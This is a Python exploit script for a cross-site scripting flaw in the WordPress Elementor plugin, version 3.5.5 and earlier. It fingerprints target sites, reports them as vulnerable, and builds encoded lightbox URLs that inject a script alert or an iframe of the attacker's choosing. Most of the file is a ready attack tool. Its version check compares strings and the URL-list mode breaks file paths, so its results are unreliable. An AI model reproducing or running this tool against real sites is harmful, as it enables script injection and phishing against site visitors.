import requests
import re
import base64
import readline
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    print(Fore.CYAN + """
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┓┏┓┏┓┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛┏┛━━┃ ┫┏┛┗┫
┗┛┗┛┗┛  ┗━┗┛┗━┗━  ┻┗┛┗━┗┛
WP Elementor <=3.5.5 XSS  
    """ + Style.RESET_ALL)

# Function to ensure the URL has the correct protocol
def ensure_protocol(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url  # Default to http, can change to https if needed
    return url

# Function to check Elementor version from plugin files
def get_elementor_version_from_file(target_url):
    possible_paths = [
        "/wp-content/plugins/elementor/assets/css/frontend.min.css",
        "/wp-content/plugins/elementor/assets/js/frontend.min.js"
    ]
    
    for path in possible_paths:
        try:
            response = requests.get(f"{target_url}{path}")
            response.raise_for_status()
            
            # Search for version number in the first line
            version_match = re.search(r'v(\d+\.\d+\.\d+)', response.text)
            if version_match:
                version = version_match.group(1)
                print(Fore.GREEN + f"Elementor version found in {path}: {version}")
                return version
        except Exception as e:
            print(Fore.RED + f"Error accessing {path}: {e}")
    
    print(Fore.YELLOW + "Elementor version not found in specified files.")
    return None

# Function to encode payloads to base64
def encode_payload(payload):
    payload_bytes = payload.encode('utf-8')
    base64_bytes = base64.b64encode(payload_bytes)
    base64_payload = base64_bytes.decode('utf-8')
    return base64_payload

# Function to process a file full of URLs
def process_urls_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
            
            for url in urls:
                url = url.strip()
                url = ensure_protocol(url)
                print(Fore.CYAN + f"Checking {url}...")
                version = get_elementor_version_from_file(url)
                
                if version and version <= "3.5.5":
                    print(Fore.RED + f"{url} is vulnerable!")
                else:
                    print(Fore.GREEN + f"{url} is not vulnerable.")
                    
    except Exception as e:
        print(Fore.RED + f"Error processing file: {e}")

# Define the main function
def main():
    print_banner()
    
    while True:
        try:
            target_url = input(Fore.CYAN + "Enter the target URL or file path (e.g., https://example.com or urls.txt): ")
            target_url = ensure_protocol(target_url)
            
            if target_url.endswith('.txt'):
                process_urls_from_file(target_url)
            else:
                version = get_elementor_version_from_file(target_url)
                
                if version is None:
                    continue
                
                if version <= "3.5.5":
                    print(Fore.RED + "It's Vulnerable!")
                    
                    choice = input(Fore.YELLOW + "Choose payload: (1) XSS or (2) iFrame Injection: ")
                    
                    if choice == "1":
                        alert_message = input(Fore.YELLOW + "Enter the XSS alert message (e.g., 'xss'): ")
                        xss_payload = f'{{"type":"null","html":"<script>alert(\'{alert_message}\')</script>"}}'
                        encoded_payload = encode_payload(xss_payload)
                        exploit_url = f"{target_url}/#elementor-action:action=lightbox&settings={encoded_payload}"
                        print(Fore.GREEN + f"XSS Payload URL: {exploit_url}")
                    
                    elif choice == "2":
                        iframe_url = input(Fore.YELLOW + "Enter the iFrame URL (e.g., 'https://example.com'): ")
                        iframe_payload = f'{{"type":"video","url":"{iframe_url}"}}'
                        encoded_payload = encode_payload(iframe_payload)
                        exploit_url = f"{target_url}/#elementor-action:action=lightbox&settings={encoded_payload}"
                        print(Fore.GREEN + f"iFrame Injection Payload URL: {exploit_url}")
                    
                    else:
                        print(Fore.RED + "Invalid choice.")
                
                else:
                    print(Fore.GREEN + "Site not Vulnerable.")
                    
        except KeyboardInterrupt:
            print(Fore.RED + "\nExiting...")
            break

# Run the main function
if __name__ == "__main__":
    main()

